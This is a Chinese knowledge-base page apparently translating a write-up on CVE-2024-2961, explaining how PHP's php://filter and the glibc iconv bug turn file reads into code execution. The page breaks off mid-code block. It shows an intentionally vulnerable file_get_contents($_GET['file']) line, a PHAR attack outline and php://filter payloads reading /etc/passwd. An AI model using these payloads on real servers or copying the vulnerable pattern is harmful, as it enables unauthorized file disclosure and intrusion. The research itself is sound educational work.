<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961） | wjlin0</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.wjlin0.com/en/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.wjlin0.com/en/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.wjlin0.com/en/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" property="og:locale:alternate" content="zh"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961） | wjlin0"><meta data-rh="true" name="description" content="|作者|修订时间|"><meta data-rh="true" property="og:description" content="|作者|修订时间|"><link data-rh="true" rel="icon" href="/en/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.wjlin0.com/en/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><link data-rh="true" rel="alternate" href="https://blog.wjlin0.com/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" hreflang="zh"><link data-rh="true" rel="alternate" href="https://blog.wjlin0.com/en/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" hreflang="en"><link data-rh="true" rel="alternate" href="https://blog.wjlin0.com/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）","item":"https://blog.wjlin0.com/en/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"}]}</script><link rel="stylesheet" href="/en/assets/css/styles.b3fb48aa.css">
<script src="/en/assets/js/runtime~main.63f31c9d.js" defer="defer"></script>
<script src="/en/assets/js/main.ec282de2.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/en/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/en/"><div class="navbar__logo"><img src="/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">知识库</b></a><a href="https://www.wjlin0.com" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">博客<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><a href="https://icp.wjlin0.com" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">ICP备案查询<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/wjlin0/wjlin0.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/en/docs/intro"><span title="intro" class="linkLabel_WmDU">intro</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/en/docs/个人知识库/渗透测试/信息收集/"><span title="个人知识库" class="categoryLinkLabel_W154">个人知识库</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/渗透测试/信息收集/"><span title="渗透测试" class="categoryLinkLabel_W154">渗透测试</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/漏洞复现/Thinkphp/Thinkphp5.0.22远程代码执行"><span title="漏洞复现" class="categoryLinkLabel_W154">漏洞复现</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/代码审计/Java/基础审计/JAVA反序列化漏洞"><span title="代码审计" class="categoryLinkLabel_W154">代码审计</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/疑难杂症/k3s/Traefik资源跨命名空间调用/"><span title="疑难杂症" class="categoryLinkLabel_W154">疑难杂症</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/en/docs/个人知识库/语言知识/"><span title="语言知识" class="categoryLinkLabel_W154">语言知识</span></a><button aria-label="Expand sidebar category &#x27;语言知识&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/pathScan-doc/下载安装"><span title="pathScan-doc" class="categoryLinkLabel_W154">pathScan-doc</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/en/docs/个人知识库/CTF/Knownsec/knownsec-ctf-09/"><span title="CTF" class="categoryLinkLabel_W154">CTF</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/CTF/Knownsec/knownsec-ctf-09/"><span title="Knownsec" class="categoryLinkLabel_W154">Knownsec</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/en/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><span title="奇技淫巧" class="categoryLinkLabel_W154">奇技淫巧</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/en/docs/个人知识库/CTF/奇技淫巧/PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><span title="01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" class="linkLabel_WmDU">01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/个人知识库/CTF/奇技淫巧/利用shell脚本变量构造无字母数字命令"><span title="利用shell脚本变量构造无字母数字命令" class="linkLabel_WmDU">利用shell脚本变量构造无字母数字命令</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/个人知识库/CTF/奇技淫巧/FILTERS的任意格式输出"><span title="FILTERS的任意格式输出" class="linkLabel_WmDU">FILTERS的任意格式输出</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/个人知识库/CTF/奇技淫巧/JS2PY意外获取根对象CVE-2024-28397"><span title="JS2PY意外获取根对象CVE-2024-28397" class="linkLabel_WmDU">JS2PY意外获取根对象CVE-2024-28397</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/个人知识库/CTF/奇技淫巧/Handlebars-AST注入"><span title="Handlebars-AST注入" class="linkLabel_WmDU">Handlebars-AST注入</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/CTF/各类CTF比赛WP/01.2025年能源CTF大赛社会组/"><span title="各类CTF比赛WP" class="categoryLinkLabel_W154">各类CTF比赛WP</span></a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/工具分享/RAGFlow安装/"><span title="工具分享" class="categoryLinkLabel_W154">工具分享</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/漏洞合集/中间件/Apache/Kafka Connect任意文件读取漏洞（CVE-2025-27817）"><span title="漏洞合集" class="categoryLinkLabel_W154">漏洞合集</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/en/docs/个人知识库/公众号文章/Perplexity Pro免费获取一年订阅"><span title="公众号文章" class="categoryLinkLabel_W154">公众号文章</span></a></div></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/en/docs/更新日志"><span title="更新日志" class="linkLabel_WmDU">更新日志</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/en/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">个人知识库</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">CTF</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">奇技淫巧</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）</h1></header>
<table><thead><tr><th style="text-align:left">作者</th><th style="text-align:left">修订时间</th></tr></thead><tbody><tr><td style="text-align:left"><img decoding="async" loading="lazy" src="https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green" alt="wjlin0" class="img_ev3q"></td><td style="text-align:left">2025-10-15 00:52:29</td></tr></tbody></table>
<table><thead><tr><th style="text-align:left">作者</th><th style="text-align:left">修订时间</th></tr></thead><tbody><tr><td style="text-align:left"><img decoding="async" loading="lazy" src="https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green" alt="wjlin0" class="img_ev3q"></td><td style="text-align:left">2025-10-15 00:27:21</td></tr></tbody></table>
<h1>PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="Direct link to 介绍" title="Direct link to 介绍" translate="no">​</a></h2>
<p>几个月前，我偶然在 glibc（Linux 程序的基础库）中发现了一个已有 24 年历史的缓冲区溢出。尽管可以在多个知名库或可执行文件中访问，但它被证明很少可利用——虽然它没有提供太多的回旋余地，但它需要难以实现的先决条件。寻找目标主要会导致失望。然而，在PHP上，这个错误大放异彩，并被证明在以两种不同的方式利用其引擎方面很有用。</p>
<p>由于材料数量众多，该错误的影响和利用将记录在由三部分组成的系列中。在本系列的第一部分中，我将描述我是如何遇到这个错误的，为什么合适的目标很少见，最后深入研究 PHP 引擎，演示一种新的利用向量：在 PHP 应用程序中将文件读取原语转换为远程代码执行。</p>
<p>如果您不熟悉 Web 开发、PHP 或 PHP 引擎，请不要介意：我将在此过程中解释相关概念。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="发现一个关于过滤器的故事">发现：一个关于过滤器的故事<a href="#发现一个关于过滤器的故事" class="hash-link" aria-label="Direct link to 发现：一个关于过滤器的故事" title="Direct link to 发现：一个关于过滤器的故事" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="php-中的文件读取原语">PHP 中的文件读取原语<a href="#php-中的文件读取原语" class="hash-link" aria-label="Direct link to PHP 中的文件读取原语" title="Direct link to PHP 中的文件读取原语" translate="no">​</a></h3>
<p>让我们首先介绍基础知识。假设在执行评估时，发现一个文件读取原语，如下所示：</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo file_get_contents($_GET[&#x27;file&#x27;]);</span><br></span></code></pre></div></div>
<p>你能用它做什么？好吧，显然，读取文件。例如，您可以阅读 <code>/etc/passwd</code> 。但是 PHP 还允许您使用其他协议，例如 <code>http://</code> 或 <code>ftp://</code> .因此，您可以要求 PHP 为您获取 google 的首页，使用 <code>http://google.com</code> ;或从 FTP 服务器下载文件，使用 <code>ftp://user:passwd@ftp.target.com/file.bin</code> .但这还不是全部;PHP 还实现了自定义协议，例如 <code>phar://</code> .</p>
<p><code>phar://</code> 允许您在 PHAR 存档中读取。PHAR 代表 PHP 存档，就像 JAR 代表 Java 存档一样。它是一组文件，例如：</p>
<ul>
<li>Source code 源代码</li>
<li>Resources 资源</li>
<li>Serialized metadata 序列化元数据</li>
</ul>
<p>多年来，该协议一直是PHP的垮台，因为当您使用它访问PHAR文件时，其元数据会被反序列化。通常的 PHAR 攻击如下所示：</p>
<ul>
<li>将 PHAR 存档上传到目标服务器（PHAR 文件非常多语言，因此您可以使它们看起来像图像、PDF 或任何东西，真的）</li>
<li>使用文件读取原语访问 PHAR 文件，并使用 <code>phar:///path/to/file.phar/test</code></li>
<li>任意有效负载被反序列化</li>
</ul>
<p>可以通过多种方式将反序列化转换为代码执行，但人们通常依赖于 PHP 上的首选反序列化工具 PHPGGC。</p>
<p>PHAR 攻击的影响怎么强调都不为过。自 2018 年创建以来，它们一直是在 PHP 目标上获得外壳的关键。但派对即将结束：</p>
<ul>
<li>
<p>从 PHP 8.0（2020 年发布）开始， <code>phar://</code> 不再反序列化元数据。（无论如何，他们都没有使用元数据，所以为什么要反序列化它）。这将完全杀死 PHAR 攻击。</p>
</li>
<li>
<p>大型应用程序（如Drupal或Magento）一直在禁用该协议 <code>phar://</code></p>
</li>
<li>
<p>随着时间的流逝，反序列化将变得越来越难以利用：图书馆正在修补其反序列化链，而打字正在卷土重来，从而大大减少了反序列化路径。</p>
</li>
<li>
<p>但 <code>phar://</code> 并不是唯一对攻击者有用的协议;另一个也产生了很好的结果： <code>php://filter</code> .</p>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="php过滤器简介">PHP过滤器简介<a href="#php过滤器简介" class="hash-link" aria-label="Direct link to PHP过滤器简介" title="Direct link to PHP过滤器简介" translate="no">​</a></h3>
<p>几年来，人们对另一种特定于 PHP 的协议产生了兴趣 <code>php://filter</code> （如果名称不明显的话）。它提供了一种在返回流之前将转换应用于流的方法。语法为：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/[filters...]/resource=[resource]</span><br></span></code></pre></div></div>
<p>资源可以是我们在上一节中已经讨论过的任何内容：一个简单的文件、一个 HTTP 响应、一个来自 FTP 服务器的文件......
筛选器是您希望 PHP 应用于流的转换列表。在这里，我们要求 PHP 使用 <code>convert.base64-encode</code> 过滤器将资源的内容转换为 base64：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/convert.base64-encode/resource=/etc/passwd</span><br></span></code></pre></div></div>
<p>它返回：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Yi92bnN0YXQ6L2Jpbi9mYWxzZQpyZWRpczp4OjEwMjoxMDM6cmVkaXM6L3Zhci9saWIvcmVkaXM6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">L2Jpbi9mYWxzZQo=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">您可以根据需要添加任意数量的过滤器。在这里，我要求 PHP 对流进行两次 base64 编码：</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd</span><br></span></code></pre></div></div>
<p>我得到：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Y205dmREcDRPakE2TURweWIyOTBPaTl5YjI5ME9pOWlhVzR2WVhOb0NtSnBianA0T2pFNk1UcGlh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RXdNam94TURNNmNtVmthWE02TDNaaGNpOXNhV0l2Y21Wa2FYTTZMMkpwYmk5bVlXeHpaUW89</span><br></span></code></pre></div></div>
<p>显然，base64 编码并不是您唯一可以做的事情。有许多过滤器可用。它们包括：</p>
<ul>
<li><code>string.upper</code>, which converts a string to uppercase
<code>string.upper</code> ，将字符串转换为大写</li>
<li><code>string.lower</code>, which converts a string to lowercase
<code>string.lower</code> ，将字符串转换为小写</li>
<li><code>string.rot13</code>, which does some BC crypto
<code>string.rot13</code> ，它做了一些 BC 加密</li>
<li><code>convert.iconv.X.Y</code>, which converts charset from <code>X</code> to <code>Y</code>
<code>convert.iconv.X.Y</code> ，这会将 charset 从 <code>X</code> 转换为 <code>Y</code></li>
</ul>
<p>让我们看一下最后一个过滤器： <code>convert.iconv.X.Y</code> .假设我需要将我的文件从 UTF8 转换为 UTF16。我可以使用：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">它给出（十六进制形式）：</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00000000: fffe 7200 6f00 6f00 7400 3a00 7800 3a00  ..r.o.o.t.:.x.:.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000010: 3000 3a00 3000 3a00 7200 6f00 6f00 7400  0.:.0.:.r.o.o.t.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token 